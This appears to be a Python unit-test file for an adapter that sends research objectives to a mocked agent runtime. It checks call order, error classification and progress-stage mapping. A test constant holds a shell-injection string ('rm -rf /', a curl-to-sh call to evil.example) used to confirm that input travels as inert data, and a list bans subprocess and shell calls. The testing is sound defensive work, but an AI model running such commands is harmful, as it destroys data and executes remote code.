"""Talking to Omnigent: the sequence, the safety, and the named failures.

The SDK is mocked throughout. No test in this repository may need a live model,
a running server or a credential, and the whole point of the adapter is that the
contract it speaks is small enough to mock honestly: resolve an agent, resolve a
runner, create a session, bind it, post a message, stream events.

The sharpest test here is `test_a_hostile_objective_arrives_byte_for_byte`. The
objective is a person's text, and the one thing that must never happen is for it
to become syntax. There is no subprocess on this path, and the test asserts both
the absence of the import and the arrival of the exact bytes.
"""
import inspect
import sys
import types
import unittest
from pathlib import Path

from biosense import contracts as K
from biosense.production import discovery as DISC
from biosense.production import omnigent_runtime as OMNI
from biosense.production import runtime as RT
from biosense.production import stages as ST

HOSTILE = (
    "Increase yield; rm -rf / && curl evil.example | sh `whoami` $(id) "
    "\"quoted\" 'single' \\backslash\n newline --flag=1"
)


# ── a mock SDK, shaped like the real one ────────────────────────────────
class _Agent:
    def __init__(self, id='ag_1', harness='claude-sdk'):
        self.id, self.harness = id, harness


class _Session:
    def __init__(self, sid='conv_1', harness='claude-sdk'):
        self.id = sid
        self.harness = harness
        self.llm_model = 'anthropic/claude-sonnet'
        self.status = 'idle'
        self.last_task_error = None


class _Sessions:
    """Records what the adapter did, so the sequence can be asserted."""

    def __init__(self, outer):
        self.outer = outer
        self.calls = []

    async def resolve_agent(self, name):
        self.calls.append(('resolve_agent', name))
        if self.outer.agent_missing:
            raise LookupError(f'No agent named {name!r} is registered on this server.')
        return _Agent()

    async def resolve_online_runner(self, harness=None, canonicalize=None):
        self.calls.append(('resolve_online_runner', harness))
        return None if self.outer.no_runner else 'runner_1'

    async def create_from_agent_id(self, agent_id, title=None, workspace=None):
        self.calls.append(('create', agent_id, title, workspace))
        return _Session()

    async def bind_runner(self, sid, runner_id=None):
        self.calls.append(('bind', sid, runner_id))
        return _Session()

    async def post_event(self, sid, event):
        self.calls.append(('post_event', sid, event))
        if self.outer.post_raises:
            raise self.outer.post_raises
        return {'queued': True}

    async def stream(self, sid):
        self.calls.append(('stream', sid))
        for ev in self.outer.events:
            yield ev

    async def get(self, sid):
        self.calls.append(('get', sid))
        return _Session()

    async def interrupt(self, sid):
        self.calls.append(('interrupt', sid))


class _Client:
    def __init__(self, outer, base_url=None, headers=None, timeout=None):
        self.outer = outer
        self.base_url = base_url
        self.headers = headers or {}
        self.sessions = _Sessions(outer)

    async def close(self):
        pass


class _Harness:
    """Stands in for the installed omnigent_client module."""

    def __init__(self):
        self.events = []
        self.no_runner = False
        self.agent_missing = False
        self.post_raises = None
        self.last_client = None

    def install(self, test):
        mod = types.ModuleType('omnigent_client')

        def factory(base_url, headers=None, auth=None, timeout=30.0):
            c = _Client(self, base_url=base_url, headers=headers, timeout=timeout)
            self.last_client = c
            return c

        mod.OmnigentClient = factory
        sys.modules['omnigent_client'] = mod
        test.addCleanup(sys.modules.pop, 'omnigent_client', None)
        return self


def cfg_for(mode='local_real_ai', **env):
    base = {'BIOSENSE_RUNTIME_MODE': 'local', 'BIOSENSE_ALLOWED_RUNTIMES': 'local,synthetic'}
    base.update(env)
    return RT.from_env(env=base)


def ev(etype, **fields):
    return dict(fields, type=etype)


# ── the safety properties ───────────────────────────────────────────────
class InjectionTests(unittest.TestCase):
    def test_no_discovery_module_shells_out(self):
        """The prohibited design, asserted rather than trusted.

        Checked against the constructs themselves rather than the word
        "subprocess", which appears in a docstring saying there isn't one.
        """
        from biosense.production import discovery_runner as DR
        banned = ('import subprocess', 'from subprocess', 'subprocess.run',
                  'subprocess.Popen', 'subprocess.call', 'subprocess.check',
                  'shell=True', 'os.system(', 'os.popen(', 'os.execv', 'pty.spawn')
        for mod in (DISC, DR, ST, OMNI):
            src = inspect.getsource(mod)
            for b in banned:
                self.assertNotIn(b, src, f'{mod.__name__} uses {b}')

    def test_a_hostile_objective_arrives_byte_for_byte(self):
        """It travels as a JSON string value, so there is nothing to escape."""
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        req = DISC.build(project_id='ipsc_macrophage', objective=HOSTILE,
                         runtime_mode='local_real_ai')
        brief = DISC.render_brief(req, loop_dir='ai-test')
        OMNI.drive(cfg_for(), brief, title='t')
        posted = next(c for c in h.last_client.sessions.calls if c[0] == 'post_event')
        text = posted[2]['data']['content'][0]['text']
        self.assertIn(HOSTILE, text, 'the objective was altered on the way out')
        self.assertEqual('message', posted[2]['type'])
        self.assertEqual('user', posted[2]['data']['role'])

    def test_the_token_travels_as_a_header_and_nowhere_else(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        cfg = RT.from_env(env={'BIOSENSE_RUNTIME_MODE': 'remote',
                               'BIOSENSE_OMNIGENT_SERVER': 'https://omni.example',
                               'BIOSENSE_OMNIGENT_TOKEN': 'secret-token-xyz'})
        events = []
        OMNI.drive(cfg, 'brief text', on_event=events.append)
        self.assertEqual('Bearer secret-token-xyz',
                         h.last_client.headers.get('Authorization'))
        for e in events:
            self.assertNotIn('secret-token-xyz', repr(e))


# ── the sequence ────────────────────────────────────────────────────────
class SessionTests(unittest.TestCase):
    def test_the_documented_order_is_followed(self):
        h = _Harness().install(self)
        h.events = [ev('session.created'), ev('response.completed')]
        OMNI.drive(cfg_for(), 'brief', title='BioSense: a question')
        names = [c[0] for c in h.last_client.sessions.calls]
        self.assertEqual(['resolve_agent', 'resolve_online_runner', 'create', 'bind',
                          'post_event', 'stream', 'get'], names)

    def test_the_session_records_what_a_run_needs_to_be_found_again(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        seen = []
        out = OMNI.drive(cfg_for(), 'brief', on_session=seen.append)
        self.assertEqual('conv_1', out['session']['omnigent_session_id'])
        self.assertEqual('runner_1', out['session']['runner_id'])
        self.assertEqual('claude-sdk', out['session']['harness'])
        self.assertTrue(seen, 'the session id was not reported before the stream')

    def test_the_workspace_is_the_runner_cwd_not_a_guess(self):
        h = _Harness().install(self)
        h.events = [ev('response.completed')]
        OMNI.drive(cfg_for(), 'brief')
        create = next(c for c in h.last_client.sessions.calls if c[0] == 'create')
        self.assertEqual(str(K.ROOT), create[3])


# ── the named failures ──────────────────────────────────────────────────
class FailureTests(unittest.TestCase):
    def test_a_missing_sdk_names_the_extra_to_install(self):
        sys.modules['omnigent_client'] = None   # import machinery raises on None
        self.addCleanup(sys.modules.pop, 'omnigent_client', None)
        found = OMNI.probe(cfg_for())
        self.assertEqual('sdk_not_installed', found['reason'])
        self.assertIn('--extra omnigent', found['next_step'])

    def test_no_runner_is_its_own_reason_with_the_command_that_fixes_it(self):
        h = _Harness().install(self)
        h.no_runner = True
        found = OMNI.probe(cfg_for())
        self.assertEqual('no_runner_available', found['reason'])
        self.assertIn('omnigent host', found['next_step'])
        with self.assertRaises(RT.RuntimeUnavailable) as e:
            OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('no_runner_available', e.exception.reason)

    def test_an_unregistered_agent_is_its_own_reason(self):
        h = _Harness().install(self)
        h.agent_missing = True
        found = OMNI.probe(cfg_for())
        self.assertEqual('agent_not_registered', found['reason'])
        self.assertIn('--agent discovery_loop', found['next_step'])

    def test_the_server_refusing_a_turn_is_classified_not_swallowed(self):
        """Verified against a real server: posting to an unbound session answers
        'No runner bound for session'."""
        h = _Harness().install(self)

        class ServerError(Exception):
            status_code = 500

        h.post_raises = ServerError('No runner bound for session')
        with self.assertRaises(RT.RuntimeUnavailable) as e:
            OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('no_runner_available', e.exception.reason)

    def test_an_authentication_failure_is_distinguished_from_a_missing_credential(self):
        for status, want in ((401, 'auth_required'), (403, 'auth_invalid')):
            with self.subTest(status=status):
                h = _Harness().install(self)

                class Err(Exception):
                    status_code = None

                e = Err('nope')
                e.status_code = status
                h.post_raises = e
                code, _ = OMNI._classify(e)
                self.assertEqual(want, code)

    def test_an_unreachable_server_is_not_reported_as_a_bug(self):
        class ConnectError(Exception):
            pass

        code, _ = OMNI._classify(ConnectError('connection refused'))
        self.assertEqual('runtime_unreachable', code)

    def test_a_failed_turn_ends_the_run_as_failed_with_the_reason(self):
        h = _Harness().install(self)
        h.events = [ev('response.failed', source='llm',
                       response={'error': {'code': 'no_api_key',
                                           'message': 'ANTHROPIC_API_KEY is not set'}})]
        out = OMNI.drive(cfg_for(), 'brief')
        self.assertEqual('failed', out['terminal'])
        self.assertIn('ANTHROPIC_API_KEY', out['error'])
        self.assertEqual('model_auth_missing', OMNI.model_auth_reason(out['error']))


# ── event mapping ───────────────────────────────────────────────────────
class StageMappingTests(unittest.TestCase):
    def test_liveness_events_are_dropped(self):
        for t in ST.LIVENESS:
            self.assertIsNone(ST.map_event(ev(t)), t)

    def test_a_tool_call_moves_the_right_stage(self):
        cases = [
            ('sys_session_send', '{"title": "literature-it1"}', 'searching_literature'),
            ('sys_session_send', '{"title": "bioinformatics-it1"}', 'searching_datasets'),
            ('sys_session_send', '{"title": "analysis-it2"}', 'running_analysis'),
            ('sys_os_exec', '.venv/bin/python -m biosense.bioinformatics.cli plan --x',
             'planning_analysis'),
            ('sys_os_exec', '.venv/bin/python -m biosense.bioinformatics.cli execute --plan p',
             'running_analysis'),
            ('sys_os_exec', 'python -m biosense.production.cli advise --analysis a',
             'synthesizing_evidence'),
            ('sys_os_exec', 'python -m biosense.production.cli report --loop-dir d',
             'generating_report'),
            ('sys_os_exec', 'python -m biosense.production.cli simulate-standin --standin x',
             'testing_simulator'),
        ]
        for name, args, want in cases:
            with self.subTest(tool=name, args=args[:40]):
                self.assertEqual(want, ST.stage_for_tool(name, args))

    def test_a_tool_that_implies_nothing_moves_nothing(self):
        """Guessing a stage from `ls` would advance a tick on no evidence."""
        self.assertIsNone(ST.stage_for_tool('sys_os_exec', 'ls -la runs/'))
        self.assertIsNone(ST.stage_for_tool('sys_read_inbox', '{}'))

    def test_prose_never_moves_a_stage(self):
        """A sentence saying 'now I will search the literature' is a sentence."""
        mapped = ST.map_event(ev('response.output_item.done', item={
            'type': 'message', 'role': 'assistant',
            'content': [{'type': 'output_text',
                         'text': 'Now I will search the literature and run the analysis.'}]}))
        self.assertIsNone(mapped['stage'])

    def test_terminal_events_are_recognised(self):
        self.assertEqual('complete', ST.map_event(ev('response.completed'))['stage'])
        for t in ('response.failed', 'response.cancelled', 'response.incomplete'):
            self.assertEqual('failed', ST.map_event(ev(t, response={}))['stage'], t)

    def test_a_policy_refusal_is_shown_as_the_system_working(self):
        m = ST.map_event(ev('response.policy_denied', reason='outside the envelope'))
        self.assertEqual('refusal', m['kind'])
        self.assertIn('system working', m['simple'])

    def test_an_elicitation_asks_rather_than_answering_itself(self):
        m = ST.map_event(ev('response.elicitation_request', params={'q': 'which donor?'}))
        self.assertEqual('needs_human', m['kind'])

    def test_an_unknown_event_is_recorded_rather_than_dropped(self):
        m = ST.map_event(ev('response.something_new_in_0_17'))
        self.assertIsNotNone(m)
        self.assertEqual('note', m['kind'])

    def test_progress_is_monotone(self):
        """A late literature follow-up must not rewind the display to step three."""
        reached = {'searching_literature', 'building_hypothesis'}
        rows = {r['stage']: r['status'] for r in ST.progress(reached)}
        self.assertEqual('done', rows['searching_literature'])
        self.assertEqual('current', rows['building_hypothesis'])
        self.assertEqual('pending', rows['generating_report'])
        reached.add('searching_literature')
        rows2 = {r['stage']: r['status'] for r in ST.progress(reached)}
        self.assertEqual('current', rows2['building_hypothesis'])

    def test_a_completed_run_marks_what_it_never_reached_as_skipped(self):
        rows = {r['stage']: r['status']
                for r in ST.progress({'running_analysis'}, terminal='complete')}
        self.assertEqual('done', rows['running_analysis'])
        self.assertEqual('skipped', rows['generating_report'])

    def test_the_twelve_stages_are_the_ones_the_product_promises(self):
        self.assertEqual(
            ('understanding_objective', 'identifying_uncertainty', 'searching_literature',
             'searching_datasets', 'planning_analysis', 'running_analysis',
             'synthesizing_evidence', 'building_hypothesis', 'testing_simulator',
             'generating_report', 'complete', 'failed'), ST.STAGE_IDS)


if __name__ == '__main__':
    unittest.main()
